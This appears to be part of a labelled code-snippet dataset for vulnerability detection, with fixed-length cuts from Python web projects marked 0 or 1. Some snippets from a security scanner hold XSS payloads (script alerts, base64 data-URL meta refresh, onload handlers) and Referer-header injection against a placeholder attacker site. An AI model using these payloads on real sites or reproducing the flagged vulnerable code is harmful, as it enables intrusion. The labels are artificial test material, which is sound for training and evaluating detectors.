\t\t:param fieldname: Fieldname to be checked if hidden. \t\t", "label": 0}, {"snippet_id": 32253, "code": ")s)') parser.add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file", "label": 0}, {"snippet_id": 32735, "code": "._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;').replace( '<', '&lt;').replace(", "label": 0}, {"snippet_id": 43670, "code": ": \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs", "label": 0}, {"snippet_id": 52409, "code": "({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response", "label": 0}, {"snippet_id": 14264, "code": " url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 28518, "code": ".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from ", "label": 0}, {"snippet_id": 6070, "code": "': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames':[], 'signup_link': ' 'dashboard_link': ' 'password_reset_link': ' 'default_language': 'en', ", "label": 1}, {"snippet_id": 7729, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 28566, "code": "('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import", "label": 0}, {"snippet_id": 10496, "code": "=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd", "label": 0}, {"snippet_id": 46922, "code": ".gather( obj.set_content(content), redis.enqueue_job('mention_users', self.id, content, user_id), return_exceptions=True ) return obj async def del_comment(self, user_id, comment_id): c=await Comment.get(id", "label": 0}, {"snippet_id": 15000, "code": " from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh", "label": 0}, {"snippet_id": 19052, "code": ".MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 37265, "code": "): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro", "label": 0}, {"snippet_id": 10648, "code": ".g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary", "label": 0}, {"snippet_id": 29021, "code": "\tstats_user=sql.get_setting('stats_user') \tstats_password=sql.get_setting('stats_password') \tproxy=sql.get_setting('proxy') \tos.system(\"cp scripts/%s.\" % script) \t \tproxy_serv=proxy if proxy is not None else \"", "label": 0}, {"snippet_id": 45988, "code": "\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass", "label": 0}, {"snippet_id": 14877, "code": ") def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=", "label": 0}, {"snippet_id": 5574, "code": "'xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7", "label": 0}, {"snippet_id": 45283, "code": " Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow", "label": 0}, {"snippet_id": 50871, "code": " send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs", "label": 0}, {"snippet_id": 34056, "code": "\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or ", "label": 0}, {"snippet_id": 35932, "code": " and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\")", "label": 0}, {"snippet_id": 43385, "code": " value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text", "label": 0}, {"snippet_id": 40018, "code": "=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t", "label": 0}, {"snippet_id": 2461, "code": "] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low", "label": 0}, {"snippet_id": 43958, "code": "[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval", "label": 0}, {"snippet_id": 9041, "code": ", name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$'", "label": 0}, {"snippet_id": 32656, "code": "'markdown.extensions.toc':{ 'slugify': _gitiles_slugify }, } contents=self._Read(path[1:]) md=markdown.Markdown(extensions=extensions, extension_configs=extension_configs, tab_length=2, output_format='html4", "label": 0}, {"snippet_id": 10542, "code": ".tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports", "label": 0}, {"snippet_id": 15912, "code": ".append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self", "label": 0}, {"snippet_id": 14878, "code": " def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"-", "label": 0}, {"snippet_id": 11516, "code": "', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$", "label": 0}, {"snippet_id": 19768, "code": " for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly ", "label": 0}, {"snippet_id": 42296, "code": "): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype", "label": 0}, {"snippet_id": 2071, "code": "-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11,", "label": 0}, {"snippet_id": 32916, "code": ".write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s", "label": 1}, {"snippet_id": 53195, "code": " in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id'", "label": 0}, {"snippet_id": 17464, "code": "('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get(", "label": 0}, {"snippet_id": 13185, "code": "'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r", "label": 0}, {"snippet_id": 523, "code": ".db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads", "label": 0}, {"snippet_id": 38755, "code": " key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t", "label": 0}, {"snippet_id": 11643, "code": ".create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change", "label": 0}, {"snippet_id": 25049, "code": " test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O", "label": 0}, {"snippet_id": 11000, "code": " ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test", "label": 0}, {"snippet_id": 47470, "code": "]))) current_user: Profile=get_current_user(http_request) if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum", "label": 0}, {"snippet_id": 35053, "code": "\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name", "label": 0}, {"snippet_id": 45645, "code": ", type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators", "label": 0}, {"snippet_id": 30126, "code": " print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk -F':' '{print $1}'\"] \tfunct.ssh_command(serv, commands", "label": 0}, {"snippet_id": 10528, "code": "=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar", "label": 0}, {"snippet_id": 9769, "code": "'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider", "label": 0}, {"snippet_id": 32204, "code": " socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR", "label": 0}, {"snippet_id": 23876, "code": ") name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\")", "label": 0}, {"snippet_id": 38922, "code": ": \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue", "label": 0}, {"snippet_id": 11147, "code": " 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except", "label": 0}, {"snippet_id": 10867, "code": ".testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117'", "label": 0}, {"snippet_id": 30369, "code": "-danger\">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\"", "label": 0}, {"snippet_id": 2044, "code": " xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET", "label": 0}, {"snippet_id": 39571, "code": ".get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg", "label": 0}, {"snippet_id": 26967, "code": " as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method, params", "label": 0}, {"snippet_id": 26266, "code": " self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')[:2] !=str(data.get('country')): raise ValidationError(_('Your VAT ID", "label": 0}, {"snippet_id": 7240, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 18155, "code": ", name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$'", "label": 0}, {"snippet_id": 5864, "code": "=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload", "label": 1}, {"snippet_id": 28572, "code": " log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip'))", "label": 0}, {"snippet_id": 41882, "code": " key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend", "label": 0}, {"snippet_id": 10913, "code": ", exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases...\") print msg sh", "label": 0}, {"snippet_id": 7947, "code": "'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 3920, "code": " host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header", "label": 1}, {"snippet_id": 24257, "code": " sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils", "label": 0}, {"snippet_id": 30119, "code": " inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue('showif'): \tcommands=[\"sudo ip link|grep 'UP' | awk '{print $2}' |awk", "label": 0}, {"snippet_id": 54066, "code": "=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh", "label": 0}, {"snippet_id": 15244, "code": " test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is", "label": 0}, {"snippet_id": 28260, "code": "\tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t", "label": 0}, {"snippet_id": 5124, "code": "(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for", "label": 0}, {"snippet_id": 27044, "code": " parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name", "label": 0}, {"snippet_id": 46751, "code": " tortoise.query_utils import Q from arq import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import GithubUser from.consts import K_COMMENT", "label": 0}, {"snippet_id": 1120, "code": "=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check", "label": 1}, {"snippet_id": 20871, "code": "'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 9377, "code": ", name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 3183, "code": " \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result", "label": 0}, {"snippet_id": 41280, "code": "\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t", "label": 0}, {"snippet_id": 27357, "code": " add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj", "label": 0}, {"snippet_id": 12665, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 29986, "code": "\texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir", "label": 0}, {"snippet_id": 16583, "code": "<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url", "label": 0}, {"snippet_id": 29230, "code": ", file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp", "label": 0}, {"snippet_id": 14291, "code": "'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 13728, "code": ", name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 48151, "code": " file '\" +str(file.name) +\"' and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"]", "label": 0}, {"snippet_id": 42053, "code": ".init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx", "label": 0}, {"snippet_id": 33586, "code": "%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t", "label": 0}, {"snippet_id": 37845, "code": " strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self)", "label": 1}, {"snippet_id": 12964, "code": "\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):", "label": 0}, {"snippet_id": 11561, "code": " 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views", "label": 0}, {"snippet_id": 43084, "code": "{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants", "label": 0}, {"snippet_id": 31330, "code": "=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index", "label": 0}, {"snippet_id": 5894, "code": "%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus", "label": 0}, {"snippet_id": 47638, "code": " button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br ", "label": 0}, {"snippet_id": 21572, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$", "label": 0}, {"snippet_id": 27450, "code": " string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2.Environment( loader=jinja2.FileSystemLoader( os.path.join(os.path.dirname(__file__), '..'", "label": 0}, {"snippet_id": 54623, "code": "=markdown(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002", "label": 1}, {"snippet_id": 7436, "code": "/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch'", "label": 0}, {"snippet_id": 31854, "code": "\tservers=sql.get_dick_permit() \tpath=sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2", "label": 0}, {"snippet_id": 3460, "code": "\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W)", "label": 0}, {"snippet_id": 24780, "code": " print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format", "label": 0}, {"snippet_id": 35346, "code": "\t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields", "label": 0}, {"snippet_id": 35943, "code": ".get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and", "label": 0}, {"snippet_id": 45494, "code": ".user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,", "label": 0}, {"snippet_id": 3912, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value", "label": 1}, {"snippet_id": 47141, "code": " None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error", "label": 0}, {"snippet_id": 42581, "code": "\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label", "label": 0}, {"snippet_id": 32449, "code": ": The name of a section that is to be converted. _separator: Unused. This is actually a configurable string that is used as a replacement character for spaces in the title, typically set to '-'. Since we", "label": 0}, {"snippet_id": 24018, "code": "{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 19134, "code": " store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir", "label": 1}, {"snippet_id": 15988, "code": "{report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' ", "label": 0}, {"snippet_id": 53114, "code": ".can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status'", "label": 0}, {"snippet_id": 24072, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised", "label": 0}, {"snippet_id": 3437, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+", "label": 0}, {"snippet_id": 269, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if 